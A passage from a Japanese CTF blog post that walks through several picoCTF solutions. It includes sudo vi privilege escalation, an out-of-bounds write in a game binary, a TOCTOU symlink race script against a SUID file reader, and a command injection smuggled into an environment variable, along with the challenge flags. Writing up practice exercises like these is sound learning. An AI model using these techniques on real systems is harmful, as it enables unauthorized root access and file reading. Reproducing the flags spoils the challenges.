+</div><p>ベース (cmd_base)を用意しておいて、そこに1つの文字と、<code>*</code>をくっつけて、順に実行していくだけのものです。</p>
+<p>これにより、ala というディレクトリがあることがわかり、alaの下を調べたら kazam.txt があるのがわかりました。</p>
+<p><br /></p>
+<p>手動で、確認してみると、以下のような感じです。</p>
+<pre>
+Specialer$ . ./a*
+-bash: .: ./abra: is a directory
+
+Specialer$ . ./al*
+-bash: .: ./ala: is a directory
+
+Specialer$ . ./ala/a*
+-bash: ./ala/a*: No such file or directory
+
+Specialer$ . ./ala/k*
+-bash: return: too many arguments
+
+Specialer$ ./ala/k*
+-bash: ./ala/kazam.txt: Permission denied
+
+Specialer$ . ./ala/kazam.txt
+-bash: return: too many arguments
+</pre>
+<p><br /></p>
+<p>ファイルの中身は、readコマンドで読みました。</p>
+<pre>
+Specialer$ read -rd '' file < ./ala/kazam.txt ; echo "$file"
+return 0 picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_d5ef8b71}
+
+</pre>
+<p><br /></p>
+<p>Flag: <code>picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_d5ef8b71}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="general-skills-permissions-100-points">[General Skills]: permissions (100 points)</h2>
+<hr>
+<h3 id="challenge-3">Challenge</h3>
+<blockquote>
+<p>Can you read files in the root file?
+The system admin has provisioned an account for you on the main server:
+Can you login and read the root file?
+<br /><br />
+Hint: What programs do you have access to?</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-3">Solution</h3>
+<p>sudo で vi が起動できます。</p>
+<pre>
+picoplayer@challenge:~$ sudo -l
+[sudo] password for picoplayer:
+Matching Defaults entries for picoplayer on challenge:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User picoplayer may run the following commands on challenge:
+    (ALL) /usr/bin/vi
+</pre>
+<p><br /><br /></p>
+<p>ということで、以下でフラグは得られます。</p>
+<pre>
+sudo /usr/bin/vi /root
+</pre>
+<p><br /></p>
+<p>あるいは、viからroot accountでshellを起動することもできます。</p>
+<p>参考：<a href="https://gtfobins.github.io/gtfobins/vi/#sudo">GTFOBins</a></p>
+<p><br /></p>
+<p>Flag: <code>picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="binary-exploitation-hijacking-200-points">[Binary Exploitation]: hijacking (200 points)</h2>
+<hr>
+<h3 id="challenge-4">Challenge</h3>
+<blockquote>
+<p>Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.
+Through Social engineering, we&rsquo;ve got the credentials to use on the server. SSH is running on the server.
+<br /><br />
+Hint1: Check for Hidden files
+<br />
+Hint2: No place like Home:)</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-4">Solution</h3>
+<p>これは、作問ミスなのかな？</p>
+<p>おそらく、想定解は /home/picoctf/.server.py の方を使ったものだと思うのですが、<code>vi</code>も起動できてしまうので、前述の permissions のチャレンジと全く同じ方法で解けてしまいます。</p>
+<pre>
+picoctf@challenge:~$ sudo -l
+Matching Defaults entries for picoctf on challenge:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User picoctf may run the following commands on challenge:
+    (ALL) /usr/bin/vi
+    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
+</pre>
+<p><br /></p>
+<p>Flag: <code>picoCTF{pYth0nn_libraryH!j@CK!n9_f56dbed6}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="binary-exploitation-babygame01-100-points">[Binary Exploitation]: babygame01 (100 points)</h2>
+<hr>
+<h3 id="challenge-5">Challenge</h3>
+<blockquote>
+<p>Get the flag and reach the exit.
+Welcome to BabyGame! Navigate around the map and see what you can find! The game is available to download here. There is no source available, so you&rsquo;ll have to figure your way around the map.
+<br /><br />
+Hint1: Use &lsquo;w&rsquo;,&lsquo;a&rsquo;,&rsquo;s&rsquo;,&rsquo;d&rsquo; to move around.
+<br />
+Hint2: There may be secret commands to make your life easy.</p>
+</blockquote>
+<ul>
+<li>game (ELF 32-bit)</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-5">Solution</h3>
+<p>Ghidraを使ってデコンパイルしてみます。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="hl"><span class="lnt">25
+</span></span><span class="hl"><span class="lnt">26
+</span></span><span class="lnt">27
+</span><span class="hl"><span class="lnt">28
+</span></span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined4</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">uVar2</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">in_GS_OFFSET</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_aac</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_aa8</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">local_aa4</span><span class="p">;</span>
+  <span class="n">undefined</span> <span class="n">local_aa0</span> <span class="p">[</span><span class="mi">2700</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">local_14</span><span class="p">;</span>
+  <span class="n">undefined</span> <span class="o">*</span><span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">stack0x00000004</span><span class="p">;</span>
+  <span class="n">local_14</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">);</span>
+  <span class="n">init_player</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_aac</span><span class="p">);</span>
+  <span class="n">init_map</span><span class="p">(</span><span class="n">local_aa0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_aac</span><span class="p">);</span>
+  <span class="n">print_map</span><span class="p">(</span><span class="n">local_aa0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_aac</span><span class="p">);</span>
+  <span class="n">signal</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">sigint_handler</span><span class="p">);</span>
+  <span class="k">do</span> <span class="p">{</span>
+    <span class="k">do</span> <span class="p">{</span>
+      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
+      <span class="n">move_player</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_aac</span><span class="p">,(</span><span class="kt">int</span><span class="p">)(</span><span class="kt">char</span><span class="p">)</span><span class="n">iVar1</span><span class="p">,</span><span class="n">local_aa0</span><span class="p">);</span>
+      <span class="n">print_map</span><span class="p">(</span><span class="n">local_aa0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_aac</span><span class="p">);</span>
+<span class="hl">    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">local_aac</span> <span class="o">!=</span> <span class="mh">0x1d</span><span class="p">);</span>
+</span><span class="hl">  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">local_aa8</span> <span class="o">!=</span> <span class="mh">0x59</span><span class="p">);</span>
+</span>  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You win!&#34;</span><span class="p">);</span>
+<span class="hl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_aa4</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span>    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;flage&#34;</span><span class="p">);</span>
+    <span class="n">win</span><span class="p">();</span>
+    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">uVar2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">uVar2</span> <span class="o">=</span> <span class="n">__stack_chk_fail_local</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">uVar2</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br />
+Line 25 &amp; 26の <code>0x1d</code>と<code>0x59</code>のチェックは、単純にプレイヤーのポジションのチェックで、<code>s</code>, <code>d</code> を使ってプレーヤーをゴールまで移動させたときにループを抜けさせる判定です。</p>
+<p>ただし、単純にゴールしただけだと、<code>local_aa4</code> の値が書き換わっていないので<code>win()</code>関数が呼ばれず、フラグが表示されないまま終了してしまいます。</p>
+<p><br /></p>
+<p>以下は、プレーヤーを動かすところの関数です。</p>
+<p>上限と下限のチェックがないので、マップの範囲をはみ出すことができ、結果的に <code>local_aa4</code> の値を書き換えることができるようです。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">move_player</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">param_1</span><span class="p">,</span><span class="kt">char</span> <span class="n">param_2</span><span class="p">,</span><span class="kt">int</span> <span class="n">param_3</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">==</span> <span class="sc">&#39;l&#39;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
+    <span class="n">player_tile</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined</span><span class="p">)</span><span class="n">iVar1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">==</span> <span class="sc">&#39;p&#39;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">solve_round</span><span class="p">(</span><span class="n">param_3</span><span class="p">,</span><span class="n">param_1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="n">param_1</span> <span class="o">*</span> <span class="mh">0x5a</span> <span class="o">+</span> <span class="n">param_3</span> <span class="o">+</span> <span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">=</span> <span class="mh">0x2e</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">==</span> <span class="sc">&#39;w&#39;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="o">*</span><span class="n">param_1</span> <span class="o">=</span> <span class="o">*</span><span class="n">param_1</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">==</span> <span class="sc">&#39;s&#39;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="o">*</span><span class="n">param_1</span> <span class="o">=</span> <span class="o">*</span><span class="n">param_1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">==</span> <span class="sc">&#39;a&#39;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">==</span> <span class="sc">&#39;d&#39;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="n">param_1</span> <span class="o">*</span> <span class="mh">0x5a</span> <span class="o">+</span> <span class="n">param_3</span> <span class="o">+</span> <span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">=</span> <span class="n">player_tile</span><span class="p">;</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p>ちなみに、<code>l</code>は、プレーヤーを示すアイコンを変更するもの（おそらく、次の <code>babygame02</code> チャレンジで使うやつ）で、</p>
+<p><code>p</code>は、一気にゴールまで行ってくれる隠しコマンドです。</p>
+<p><br /><br /></p>
+<p>ぶっちゃけトライ・アンド・エラーで解いたんですが、</p>
+<p>まず、<code>w</code>を4回、次に、<code>a</code>を8回やると、フラグが取れる状態になるみたいです。</p>
+<pre>
+End tile position: 29 89
+Player has flag: 64
+</pre>
+<p><br /></p>
+<p>この状態で、<code>p</code>をすると、フラグが得られます。</p>
+<pre>
+.........................................................................................@
+You win!
+flage
+picoCTF{gamer_m0d3_enabled_2bcdc8e6}
+</pre>
+<p><br /></p>
+<p>Flag: <code>picoCTF{gamer_m0d3_enabled_2bcdc8e6}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="binary-exploitation-tic-tac-200-points">[Binary Exploitation]: tic-tac (200 points)</h2>
+<hr>
+<h3 id="challenge-6">Challenge</h3>
+<blockquote>
+<p>Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.
+<br /><br />
+ssh to saturn.picoctf.net:56072, and run the binary named &ldquo;txtreader&rdquo; once connected. Login as ctf-player with the password, 483e80d4</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-6">Solution</h3>
+<p>以下が、ホームディレクトリのファイル一覧です。</p>
+<pre>
+ctf-player@pico-chall$ ls -al
+total 32
+drwxr-xr-x 1 ctf-player ctf-player    20 Mar 21 10:13 .
+drwxr-xr-x 1 root       root          24 Mar 16 02:27 ..
+drwx------ 2 ctf-player ctf-player    34 Mar 21 10:13 .cache
+-rw-r--r-- 1 root       root          67 Mar 16 02:28 .profile
+-rw------- 1 root       root          32 Mar 16 02:28 flag.txt
+-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16 01:30 src.cpp
+-rwsr-xr-x 1 root       root       19016 Mar 16 02:28 txtreader
+</pre>
+<p><br /></p>
+<p>src.cpp は、実行ファイル <code>txtreader</code> のソースコードだと想定でき、中身は以下の通りです。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;fstream&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;Usage: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; &lt;filename&gt;&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">filename</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+  <span class="n">std</span><span class="o">::</span><span class="n">ifstream</span> <span class="n">file</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+  <span class="k">struct</span> <span class="n">stat</span> <span class="n">statbuf</span><span class="p">;</span>
+
+  <span class="c1">// Check the file&#39;s status information.
+</span><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">stat</span><span class="p">(</span><span class="n">filename</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">statbuf</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;Error: Could not retrieve file information&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="c1">// Check the file&#39;s owner.
+</span><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">statbuf</span><span class="p">.</span><span class="n">st_uid</span> <span class="o">!=</span> <span class="n">getuid</span><span class="p">())</span> <span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;Error: you don&#39;t own this file&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="c1">// Read the contents of the file.
+</span><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">file</span><span class="p">.</span><span class="n">is_open</span><span class="p">())</span> <span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">line</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">getline</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">line</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">line</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;Error: Could not open file&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p><code>txtreader</code> には、見ての通り SUID ビットが立っており、これを使って /home/ctf-player/flag.txt を読み込むチャレンジなのですが、flag.txtのオーナーはrootであるために、中身が見れません。</p>
+<p>以下、実行結果。</p>
+<pre>
+ctf-player@pico-chall$ ./txtreader flag.txt
+Error: you don't own this file
+
+</pre>
+<p><br /><br /></p>
+<p>チャレンジタイトル <code>tic-tac</code> からも想像つきますし、&ldquo;getuid bypass&rdquo; 辺りをキーワードにググってもわかるのですが、これは <a href="https://en.m.wikipedia.org/wiki/Time-of-check_to_time-of-use">TOCTOU</a> (Time of check to time of use) を使って解くチャレンジです。</p>
+<p><br /></p>
+<p>以下の2つのファイルを用意します。</p>
+<p>なお、これらのコードのサンプルは、TOCTOUを調べていると見つかります。</p>
+<ul>
+<li>exploit.sh (echoしている文字列は、何でもいいです)</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="cp">#!/bin/sh
+</span><span class="cp"></span><span class="k">while</span> <span class="nb">true</span>
+<span class="k">do</span>
+    rm temp<span class="p">;</span>
+    <span class="nb">echo</span> <span class="s2">&#34;This is a file that the user can overwrite&#34;</span> &gt; temp
+    <span class="nb">echo</span> <span class="s2">&#34;TOCTOU-Attack-test&#34;</span> <span class="p">|</span> ./txtreader temp <span class="p">&amp;</span> ./symbolic-link temp
+<span class="k">done</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<ul>
+<li>symbolic-link.c</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="n">unlink</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="n">symlink</span><span class="p">(</span><span class="s">&#34;./flag.txt&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p>これらのファイルをscpで転送しておき、symbolic-link.c は gcc でコンパイルしておきます。</p>
+<p><br /></p>
+<p>その後、exploit.shを実行すると、タイミングによってはフラグの中身が表示されることがあります。</p>
+<pre>
+ctf-player@pico-chall$ /bin/bash ./exploit.sh
+This is a file that the user can overwrite
+This is a file that the user can overwrite
+:
+(snip)
+:
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+Error: you don't own this file
+picoCTF{ToctoU_!s_3a5y_007659c9}
+Error: you don't own this file
+Error: you don't own this file
+</pre>
+<p><br /></p>
+<p>Flag: <code>picoCTF{ToctoU_!s_3a5y_007659c9}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="binary-exploitation-vne-200-points">[Binary Exploitation]: VNE (200 points)</h2>
+<hr>
+<h3 id="challenge-7">Challenge</h3>
+<blockquote>
+<p>We&rsquo;ve got a binary that can list directories as root, try it out !!
+ssh to saturn.picoctf.net:62449, and run the binary named &ldquo;bin&rdquo; once connected. Login as ctf-player with the password, 8a707622
+<br /><br />
+Hint1: Have you checked the content of the /root folder
+<br />
+Hint2: Find a way to add more instructions to the ls</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-7">Solution</h3>
+<p>ホームディレクトリに、<code>bin</code> という名前のelfファイルが置かれています。</p>
+<pre>
+ctf-player@pico-chall$ ls -al
+total 24
+drwxr-xr-x 1 ctf-player ctf-player    20 Mar 21 11:24 .
+drwxr-xr-x 1 root       root          24 Mar 16 01:59 ..
+drwx------ 2 ctf-player ctf-player    34 Mar 21 11:24 .cache
+-rw-r--r-- 1 root       root          67 Mar 16 01:59 .profile
+-rwsr-xr-x 1 root       root       18752 Mar 16 01:59 bin
+
+ctf-player@pico-chall$ file bin
+bin: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=202cb71538089bb22aa22d5d3f8f77a8a94a826f, for GNU/Linux 3.2.0, not stripped
+</pre>
+<p><br /></p>
+<p>実行してみます。</p>
+<pre>
+ctf-player@pico-chall$ ./bin
+Error: SECRET_DIR environment variable is not set
+
+ctf-player@pico-chall$ export SECRET_DIR="/root"
+
+ctf-player@pico-chall$ ./bin
+Listing the content of /root as root:
+flag.txt
+
+</pre>
+<p><br /></p>
+<p><code>strings</code> コマンドを実行してみると <code>system()</code>関数を呼んでいたりするのがわかるのと、Hint2も加味すると、Command Injectionっぽいのが何となくわかりますね。</p>
+<p><br /></p>
+<pre>
+ctf-player@pico-chall$ export SECRET_DIR="/root; cat /root/flag.txt"
+ctf-player@pico-chall$ ./bin
+Listing the content of /root; cat /root/flag.txt as root:
+flag.txt
+picoCTF{Power_t0_man!pul4t3_3nv_3f693329}
+</pre>
+<p><br /></p>
+<p>Flag: <code>picoCTF{Power_t0_man!pul4t3_3nv_3f693329}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="reverse-engineering-ready-gladiator-0-100-points">[Reverse Engineering]: Ready Gladiator 0 (100 points)</h2>
+<hr>
+<h3 id="challenge-8">Challenge</h3>
+<blockquote>
+<p>Can you make a CoreWars warrior that always loses, no ties?
+Your opponent is the Imp. The source is available here. If you wanted to pit the Imp against himself, you could download the Imp and connect to the CoreWars server like this:
+<br /><br />
+Hint1: CoreWars is a well-established game with a lot of docs and strategy
+<br />
+Hint2: Experiment with input to the CoreWars handler or create a self-defeating bot</p>
+</blockquote>
+<ul>
+<li>imp.red</li>
+</ul>
+<p>中身：</p>
+<pre>
+;redcode
+;name Imp Ex
+;assert 1
+mov 0, 1
+end
+</pre>
+<p><br /></p>
+<h3 id="solution-8">Solution</h3>
+<p>多少マニュアルとかは読んだのですが、あんまりよくわからずに解きました。</p>
